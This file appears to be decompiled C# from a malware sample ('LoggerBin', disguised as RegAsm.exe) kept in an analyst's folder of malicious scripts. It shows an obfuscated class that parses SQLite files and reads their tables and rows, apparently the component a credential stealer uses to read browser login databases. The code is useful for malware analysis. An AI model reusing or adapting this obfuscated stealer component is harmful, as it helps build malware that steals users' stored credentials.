// Decompiled with JetBrains decompiler
// Type: BH.Sh
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace BH
{
  internal class Sh
  {
    private byte[] db_bytes;
    private ulong encoding;
    private string[] field_names;
    private Sh.bo[] master_table_entries;
    private ushort page_size;
    private byte[] SQLDataTypeSize;
    private Sh.fe[] table_entries;
    internal static Sh gS;

    public Sh(string _param1)
    {
      yd.bx(yd.EI);
      this.SQLDataTypeSize = new byte[10]
      {
        (byte) 0,
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 6,
        (byte) 8,
        (byte) 8,
        (byte) 0,
        (byte) 0
      };
      // ISSUE: explicit constructor call
      base.\u002Ector();
      if (!File.Exists(_param1))
        return;
      FileSystem.FileOpen(1, _param1, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      string s = Strings.Space((int) FileSystem.LOF(1));
      FileSystem.FileGet(1, ref s);
      FileSystem.FileClose(1);
      this.db_bytes = Encoding.Default.GetBytes(s);
      if (((string) Sh.jU((object) Encoding.Default, (object) this.db_bytes, 0, 15)).CompareTo(w4.bx(424, w4.vY)) != 0)
        throw new Exception(w4.bx(458, w4.vY));
      if (this.db_bytes[52] != (byte) 0)
        throw new Exception(w4.bx(530, w4.vY));
      this.page_size = (ushort) kq.bx((object) this, 16, 2, kq.Qm);
      this.encoding = kq.bx((object) this, 56, 4, kq.Qm);
      if (Decimal.Compare(new Decimal(this.encoding), 0M) == 0)
        goto label_7;
label_6:
      xk.bx((object) this, 100UL, xk.HK);
      return;
label_7:
      int num1 = 0;
      if (false)
        goto label_8;
label_1:
      switch (num1)
      {
        default:
          this.encoding = 1UL;
          goto label_6;
      }
label_8:
      int num2;
      num1 = num2;
      goto label_1;
    }

    private ulong qV(int _param1, int _param2)
    {
      if (_param2 > 8 | _param2 == 0)
        return 0;
      ulong num1 = 0;
      int num2 = _param2 - 1;
      for (int index = 0; index <= num2; ++index)
        num1 = num1 << 8 | (ulong) this.db_bytes[_param1 + index];
      return num1;
    }

    private long bg(int _param1, int _param2)
    {
      ++_param2;
      byte[] numArray = new byte[8];
      int num1 = _param2 - _param1;
      bool flag = false;
      int num2 = 2;
      if (Sh.bj() == null)
        goto label_2;
label_1:
      int num3;
      num2 = num3;
label_2:
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_15;
          case 2:
            if (!(num1 == 0 | num1 > 9))
            {
              switch (num1)
              {
                case 1:
                  goto label_19;
                case 9:
                  if (Sh.EC())
                  {
                    num2 = 1;
                    continue;
                  }
                  goto label_1;
                default:
                  goto label_12;
              }
            }
            else
              goto label_8;
          default:
            goto label_4;
        }
      }
label_4:
      int index1;
      int index2;
      int num4;
      if (!flag)
      {
        numArray[index2] = (byte) ((uint) (byte) ((uint) this.db_bytes[index1] >> (num4 - 1 & 7)) & (uint) ((int) byte.MaxValue >> num4));
        goto label_11;
      }
      else
        goto label_11;
label_6:
      int num5;
      if (index1 < num5)
        return BitConverter.ToInt64(numArray, 0);
      int num6;
      if (index1 - 1 >= _param1)
      {
        numArray[index2] = (byte) ((uint) (byte) ((uint) this.db_bytes[index1] >> (num4 - 1 & 7)) & (uint) ((int) byte.MaxValue >> num4) | (uint) (byte) ((uint) this.db_bytes[index1 - 1] << (num6 & 7)));
        ++num4;
        ++index2;
        --num6;
        goto label_11;
      }
      else
        goto label_4;
label_8:
      return 0;
label_11:
      index1 += -1;
      goto label_6;
label_12:
      num4 = 1;
      num6 = 7;
      index2 = 0;
      if (flag)
      {
        numArray[0] = this.db_bytes[_param2 - 1];
        --_param2;
        index2 = 1;
      }
      num5 = _param1;
      index1 = _param2 - 1;
      goto label_6;
label_15:
      flag = true;
      goto label_12;
label_19:
      numArray[0] = (byte) ((uint) this.db_bytes[_param1] & (uint) sbyte.MaxValue);
      return BitConverter.ToInt64(numArray, 0);
    }

    public int yc() => this.table_entries.Length;

    public string[] IM()
    {
      string[] strArray = (string[]) null;
      int index1 = 0;
      int num1 = this.master_table_entries.Length - 1;
      for (int index2 = 0; index2 <= num1; ++index2)
      {
        if (this.master_table_entries[index2].item_type == w4.bx(624, w4.vY))
        {
          int num2 = 0;
          if (!Sh.EC())
            goto label_5;
label_1:
          switch (num2)
          {
            default:
              strArray = (string[]) Sh.n2((object) strArray, (object) new string[index1 + 1]);
              strArray[index1] = this.master_table_entries[index2].item_name;
              ++index1;
              continue;
          }
label_5:
          num2 = 0;
          goto label_1;
        }
      }
      return strArray;
    }

    public string Gf(int _param1, int _param2)
    {
      if (_param1 >= this.table_entries.Length)
        return (string) null;
      return _param2 >= this.table_entries[_param1].content.Length ? (string) null : this.table_entries[_param1].content[_param2];
    }

    public string q5(int _param1, string _param2)
    {
      int num1 = -1;
      int num2 = this.field_names.Length - 1;
      for (int index = 0; index <= num2; ++index)
      {
        if (this.field_names[index].ToLower().CompareTo(_param2.ToLower()) == 0)
        {
          num1 = index;
          goto label_7;
        }
      }
      goto label_9;
label_7:
      return num1 == -1 ? (string) null : NO.bx((object) this, _param1, num1, NO.RT);
label_9:
      int num3 = 0;
      if (!Sh.EC())
        goto label_10;
label_1:
      switch (num3)
      {
        default:
          goto label_7;
      }
label_10:
      int num4;
      num3 = num4;
      goto label_1;
    }

    private int dI(int _param1)
    {
      if (_param1 > this.db_bytes.Length)
        return 0;
      int num = _param1 + 8;
      for (int index = _param1; index <= num; ++index)
      {
        if (index > this.db_bytes.Length - 1)
          return 0;
        if (((int) this.db_bytes[index] & 128) != 128)
          return index;
      }
      return _param1 + 8;
    }

    private bool Ml(long _param1) => (_param1 & 1L) == 1L;

    private void OZ(ulong _param1)
    {
      if (this.db_bytes[(int) _param1] != (byte) 13)
        goto label_39;
      else
        goto label_5;
label_1:
      int num1;
      int num2;
      int num3;
      ulong num4;
      int num5;
      long num6;
      long[] numArray;
      int num7;
      while (true)
      {
        switch (num7)
        {
          case 1:
            goto label_33;
          case 3:
            goto label_6;
          case 4:
            rn.bx((object) this, (int) num4, num2, rn.Sw);
            num1 = mj.bx((object) this, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(num4), Decimal.Subtract(new Decimal(num2), new Decimal(num4))), 1M)), mj.Sg);
            int num8;
            num7 = Sh.EC() ? 6 : num8;
            continue;
          case 5:
            goto label_18;
          case 6:
            this.master_table_entries[num5 + num3].row_id = rn.bx((object) this, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(num4), Decimal.Subtract(new Decimal(num2), new Decimal(num4))), 1M)), num1, rn.Sw);
            num4 = Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal(num4), Decimal.Subtract(new Decimal(num1), new Decimal(num4))), 1M));
            int num9 = mj.bx((object) this, (int) num4, mj.Sg);
            num1 = num9;
            num6 = rn.bx((object) this, (int) num4, num9, rn.Sw);
            numArray = new long[5];
            int index = 0;
            do
            {
              num2 = num1 + 1;
              num1 = mj.bx((object) this, num2, mj.Sg);
              numArray[index] = rn.bx((object) this, num2, num1, rn.Sw);
              numArray[index] = numArray[index] <= 9L ? (long) this.SQLDataTypeSize[(int) numArray[index]] : (!BF.bx((object) this, numArray[index], BF.P1) ? (long) Math.Round((double) (numArray[index] - 12L) / 2.0) : (long) Math.Round((double) (numArray[index] - 13L) / 2.0));
              ++index;
            }
            while (index <= 4);
            if (Decimal.Compare(new Decimal(this.encoding), 1M) != 0)
            {
              if (Decimal.Compare(new Decimal(this.encoding), 2M) != 0)
              {
                if (Decimal.Compare(new Decimal(this.encoding), 3M) == 0)
                {
                  this.master_table_entries[num5 + num3].item_type = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(new Decimal(num4), new Decimal(num6))), (int) numArray[0]);
                  num7 = Sh.bj() == null ? 0 : 0;
                  continue;
                }
                goto label_41;
              }
              else
                goto label_37;
            }
            else
            {
              this.master_table_entries[num5 + num3].item_type = ((Encoding) Sh.Xf()).GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(new Decimal(num4), new Decimal(num6))), (int) numArray[0]);
              num7 = Sh.bj() == null ? 2 : 0;
              continue;
            }
          case 7:
            goto label_3;
          default:
            goto label_41;
        }
      }
label_3:
      ushort uint16_1;
      this.master_table_entries = (Sh.bo[]) Utils.CopyArray((Array) this.master_table_entries, (Array) new Sh.bo[this.master_table_entries.Length + (int) uint16_1 + 1]);
      goto label_8;
label_37:
      this.master_table_entries[num5 + num3].item_type = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(new Decimal(num4), new Decimal(num6))), (int) numArray[0]);
label_41:
      if (Decimal.Compare(new Decimal(this.encoding), 1M) != 0)
        goto label_17;
      else
        goto label_40;
label_10:
      this.master_table_entries[num5 + num3].root_num = (long) kq.bx((object) this, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(num4), new Decimal(num6)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2]))), (int) numArray[3], kq.Qm);
      if (Decimal.Compare(new Decimal(this.encoding), 1M) != 0)
      {
        if (Decimal.Compare(new Decimal(this.encoding), 2M) != 0)
        {
          if (Decimal.Compare(new Decimal(this.encoding), 3M) == 0)
            this.master_table_entries[num5 + num3].sql_statement = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(num4), new Decimal(num6)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), (int) numArray[4]);
        }
        else
          this.master_table_entries[num5 + num3].sql_statement = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(num4), new Decimal(num6)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), (int) numArray[4]);
      }
      else
        this.master_table_entries[num5 + num3].sql_statement = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(num4), new Decimal(num6)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), (int) numArray[4]);
      ++num3;
      goto label_31;
label_17:
      if (Decimal.Compare(new Decimal(this.encoding), 2M) != 0)
      {
        if (Decimal.Compare(new Decimal(this.encoding), 3M) == 0)
        {
          this.master_table_entries[num5 + num3].item_name = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Sh.Pv(new Decimal(num4), new Decimal(num6)), new Decimal(numArray[0]))), (int) numArray[1]);
          goto label_10;
        }
        else
          goto label_10;
      }
      else
      {
        this.master_table_entries[num5 + num3].item_name = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(num4), new Decimal(num6)), new Decimal(numArray[0]))), (int) numArray[1]);
        goto label_10;
      }
label_40:
      this.master_table_entries[num5 + num3].item_name = ((Encoding) Sh.Xf()).GetString(this.db_bytes, Convert.ToInt32(Sh.Pv(Decimal.Add(new Decimal(num4), new Decimal(num6)), new Decimal(numArray[0]))), (int) numArray[1]);
      goto label_10;
label_5:
      uint16_1 = Convert.ToUInt16(Decimal.Subtract(new Decimal(kq.bx((object) this, Convert.ToInt32(Decimal.Add(new Decimal(_param1), 3M)), 2, kq.Qm)), 1M));
      num5 = 0;
      if (this.master_table_entries != null)
      {
        num5 = this.master_table_entries.Length;
        num7 = 7;
        goto label_1;
      }
label_6:
      this.master_table_entries = new Sh.bo[(int) uint16_1 + 1];
label_8:
      int num10 = (int) uint16_1;
      num3 = 0;
      goto label_31;
label_13:
      int num11;
      ++num11;
      num7 = 0;
      if (Sh.bj() == null)
      {
        num7 = 1;
        goto label_1;
      }
      else
        goto label_1;
label_18:
      ushort num12;
      xk.bx((object) this, Convert.ToUInt64(Decimal.Multiply(Sh.vJ(new Decimal(kq.bx((object) this, (int) ((long) _param1 + (long) num12), 4, kq.Qm)), 1M), new Decimal((int) this.page_size))), xk.HK);
      goto label_13;
label_31:
      if (num3 > num10)
        return;
      num4 = kq.bx((object) this, Convert.ToInt32(Decimal.Add(Sh.Pv(new Decimal(_param1), 8M), new Decimal(num3 * 2))), 2, kq.Qm);
      if (Decimal.Compare(new Decimal(_param1), 100M) != 0)
        goto label_26;
label_15:
      num2 = mj.bx((object) this, (int) num4, mj.Sg);
      num7 = 4;
      goto label_1;
label_26:
      num4 += _param1;
      goto label_15;
label_33:
      int uint16_2;
      if (num11 <= uint16_2)
      {
        num12 = (ushort) kq.bx((object) this, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(_param1), 12M), new Decimal(num11 * 2))), 2, kq.Qm);
        if (Decimal.Compare(new Decimal(_param1), 100M) == 0)
        {
          xk.bx((object) this, Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(kq.bx((object) this, (int) num12, 4, kq.Qm)), 1M), new Decimal((int) this.page_size))), xk.HK);
          goto label_13;
        }
        else
          goto label_18;
      }
      else
      {
        xk.bx((object) this, Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(kq.bx((object) this, Convert.ToInt32(Decimal.Add(new Decimal(_param1), 8M)), 4, kq.Qm)), 1M), new Decimal((int) this.page_size))), xk.HK);
        return;
      }
label_39:
      if (this.db_bytes[(int) _param1] != (byte) 5)
        return;
      uint16_2 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(kq.bx((object) this, Convert.ToInt32(Decimal.Add(new Decimal(_param1), 3M)), 2, kq.Qm)), 1M));
      num11 = 0;
      goto label_33;
    }

    public bool h4(string _param1)
    {
      int index1 = -1;
      int num1 = this.master_table_entries.Length - 1;
      for (int index2 = 0; index2 <= num1; ++index2)
      {
        if (this.master_table_entries[index2].item_name.ToLower().CompareTo(_param1.ToLower()) == 0)
        {
          index1 = index2;
          goto label_14;
        }
      }
      goto label_16;
label_1:
      int num2;
      int num3 = num2;
label_2:
      switch (num3)
      {
        case 1:
          goto label_14;
      }
label_9:
      return n0.bx((object) this, (ulong) (this.master_table_entries[index1].root_num - 1L) * (ulong) this.page_size, n0.C2);
label_14:
      if (index1 == -1)
        return false;
      string[] strArray = ((string) Sh.mg((object) this.master_table_entries[index1].sql_statement, this.master_table_entries[index1].sql_statement.IndexOf(w4.bx(638, w4.vY)) + 1)).Split(',');
      int num4 = strArray.Length - 1;
      for (int index2 = 0; index2 <= num4; ++index2)
      {
        strArray[index2] = (string) Sh.mo((object) strArray[index2], (object) new char[0]);
        int length = strArray[index2].IndexOf(w4.bx(644, w4.vY));
        if (length > 0)
          strArray[index2] = strArray[index2].Substring(0, length);
        if (strArray[index2].IndexOf(w4.bx(650, w4.vY)) != 0)
        {
          this.field_names = (string[]) Utils.CopyArray((Array) this.field_names, (Array) new string[index2 + 1]);
          this.field_names[index2] = strArray[index2];
        }
        else
          goto label_9;
      }
      num3 = 0;
      if (Sh.bj() == null)
        goto label_2;
      else
        goto label_1;
label_16:
      if (Sh.EC())
      {
        num3 = 1;
        goto label_2;
      }
      else
        goto label_1;
    }

    private bool Pj(ulong _param1)
    {
      if (this.db_bytes[(int) _param1] != (byte) 13)
        goto label_37;
      else
        goto label_15;
label_1:
      int num1;
      int num2 = num1;
label_2:
      int num3;
      int int32;
      while (true)
      {
        int num4;
        int index1;
        ulong uint64;
        long num5;
        int num6;
        Sh.Yx[] yxArray;
        int num7;
        int num8;
        switch (num2)
        {
          case 1:
            goto label_23;
          case 2:
            num7 = yxArray.Length - 1;
            num2 = Sh.bj() == null ? 3 : 1;
            continue;
          case 3:
            index1 = 0;
            break;
          case 4:
            goto label_37;
          case 5:
            if (this.table_entries == null)
            {
              this.table_entries = new Sh.fe[int32 + 1];
            }
            else
            {
              num3 = this.table_entries.Length;
              this.table_entries = (Sh.fe[]) Utils.CopyArray((Array) this.table_entries, (Array) new Sh.fe[this.table_entries.Length + int32 + 1]);
            }
            num8 = int32;
            num4 = 0;
            goto label_35;
          case 6:
            goto label_38;
          case 7:
            if (Decimal.Compare(new Decimal(this.encoding), 2M) != 0)
            {
              if (Decimal.Compare(new Decimal(this.encoding), 3M) == 0)
              {
                this.table_entries[num3 + num4].content[index1] = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num5)), new Decimal(num6))), (int) yxArray[index1].size);
                goto label_27;
              }
              else
                goto label_27;
            }
            else
            {
              this.table_entries[num3 + num4].content[index1] = Encoding.Unicode.GetString(this.db_bytes, Sh.Xm(Decimal.Add(Sh.Pv(new Decimal(uint64), new Decimal(num5)), new Decimal(num6))), (int) yxArray[index1].size);
              goto label_27;
            }
          default:
label_6:
            if (yxArray[index1].type <= 9L)
            {
              this.table_entries[num3 + num4].content[index1] = Conversions.ToString(kq.bx((object) this, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num5)), new Decimal(num6))), (int) yxArray[index1].size, kq.Qm));
              goto label_27;
            }
            else if (!BF.bx((object) this, yxArray[index1].type, BF.P1))
            {
              if (Decimal.Compare(new Decimal(this.encoding), 1M) == 0)
              {
                this.table_entries[num3 + num4].content[index1] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num5)), new Decimal(num6))), (int) yxArray[index1].size);
                goto label_27;
              }
              else
                goto case 7;
            }
            else
            {
              this.table_entries[num3 + num4].content[index1] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num5)), new Decimal(num6))), (int) yxArray[index1].size);
              goto label_27;
            }
        }
label_19:
        if (index1 > num7)
        {
          ++num4;
          goto label_35;
        }
        else
          goto label_6;
label_27:
        num6 += (int) yxArray[index1].size;
        ++index1;
        goto label_19;
label_35:
        if (num4 <= num8)
        {
          yxArray = (Sh.Yx[]) null;
          ulong num9 = kq.bx((object) this, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(_param1), 8M), new Decimal(num4 * 2))), 2, kq.Qm);
          if (Decimal.Compare(new Decimal(_param1), 100M) != 0)
            goto label_33;
label_26:
          int num10 = mj.bx((object) this, (int) num9, mj.Sg);
          rn.bx((object) this, (int) num9, num10, rn.Sw);
          int num11 = mj.bx((object) this, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(num9), Decimal.Subtract(new Decimal(num10), new Decimal(num9))), 1M)), mj.Sg);
          this.table_entries[num3 + num4].row_id = rn.bx((object) this, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(num9), Decimal.Subtract(new Decimal(num10), new Decimal(num9))), 1M)), num11, rn.Sw);
          uint64 = Convert.ToUInt64(Decimal.Add(Sh.Pv(new Decimal(num9), Decimal.Subtract(new Decimal(num11), new Decimal(num9))), 1M));
          int num12 = mj.bx((object) this, (int) uint64, mj.Sg);
          int num13 = num12;
          num5 = rn.bx((object) this, (int) uint64, num12, rn.Sw);
          long num14 = Convert.ToInt64(Decimal.Add(Decimal.Subtract(new Decimal(uint64), new Decimal(num12)), 1M));
          int index2 = 0;
          while (num14 < num5)
          {
            yxArray = (Sh.Yx[]) Utils.CopyArray((Array) yxArray, (Array) new Sh.Yx[index2 + 1]);
            int num15 = num13 + 1;
            num13 = mj.bx((object) this, num15, mj.Sg);
            yxArray[index2].type = rn.bx((object) this, num15, num13, rn.Sw);
            yxArray[index2].size = yxArray[index2].type <= 9L ? (long) this.SQLDataTypeSize[(int) yxArray[index2].type] : (!BF.bx((object) this, yxArray[index2].type, BF.P1) ? (long) Math.Round((double) (yxArray[index2].type - 12L) / 2.0) : (long) Math.Round((double) (yxArray[index2].type - 13L) / 2.0));
            num14 = num14 + (long) (num13 - num15) + 1L;
            ++index2;
          }
          this.table_entries[num3 + num4].content = new string[yxArray.Length - 1 + 1];
          num6 = 0;
          num2 = 2;
          continue;
label_33:
          num9 += _param1;
          goto label_26;
        }
        else
          goto label_17;
      }
label_23:
      num3 = 0;
      num1 = 5;
      goto label_1;
label_38:
      int uint16;
      for (int index = 0; index <= uint16; ++index)
      {
        ushort num4 = (ushort) kq.bx((object) this, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(_param1), 12M), new Decimal(index * 2))), 2, kq.Qm);
        n0.bx((object) this, Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(kq.bx((object) this, (int) ((long) _param1 + (long) num4), 4, kq.Qm)), 1M), new Decimal((int) this.page_size))), n0.C2);
      }
      n0.bx((object) this, Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(kq.bx((object) this, Convert.ToInt32(Decimal.Add(new Decimal(_param1), 8M)), 4, kq.Qm)), 1M), new Decimal((int) this.page_size))), n0.C2);
      goto label_17;
label_15:
      int32 = Convert.ToInt32(Decimal.Subtract(new Decimal(kq.bx((object) this, Convert.ToInt32(Decimal.Add(new Decimal(_param1), 3M)), 2, kq.Qm)), 1M));
      if (Sh.EC())
      {
        num2 = 1;
        goto label_2;
      }
      else
        goto label_1;
label_17:
      return true;
label_37:
      if (this.db_bytes[(int) _param1] == (byte) 5)
      {
        uint16 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(kq.bx((object) this, Convert.ToInt32(Decimal.Add(new Decimal(_param1), 3M)), 2, kq.Qm)), 1M));
        num2 = 6;
        goto label_2;
      }
      else
        goto label_17;
    }

    internal static object jU([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3) => (object) ((Encoding) obj0).GetString((byte[]) obj1, obj2, obj3);

    internal static bool EC() => Sh.gS == null;

    internal static Sh bj() => Sh.gS;

    internal static object n2([In] object obj0, [In] object obj1) => (object) Utils.CopyArray((Array) obj0, (Array) obj1);

    internal static Decimal Pv([In] Decimal obj0, [In] Decimal obj1) => Decimal.Add(obj0, obj1);

    internal static object Xf() => (object) Encoding.Default;

    internal static Decimal vJ([In] Decimal obj0, [In] Decimal obj1) => Decimal.Subtract(obj0, obj1);

    internal static object mg([In] object obj0, [In] int obj1) => (object) ((string) obj0).Substring(obj1);

    internal static object mo([In] object obj0, [In] object obj1) => (object) ((string) obj0).TrimStart((char[]) obj1);

    internal static int Xm([In] Decimal obj0) => Convert.ToInt32(obj0);

    private struct Yx
    {
      public long size;
      public long type;
    }

    private struct bo
    {
      public long row_id;
      public string item_type;
      public string item_name;
      public string astable_name;
      public long root_num;
      public string sql_statement;
    }

    private struct fe
    {
      public long row_id;
      public string[] content;
    }
  }
}
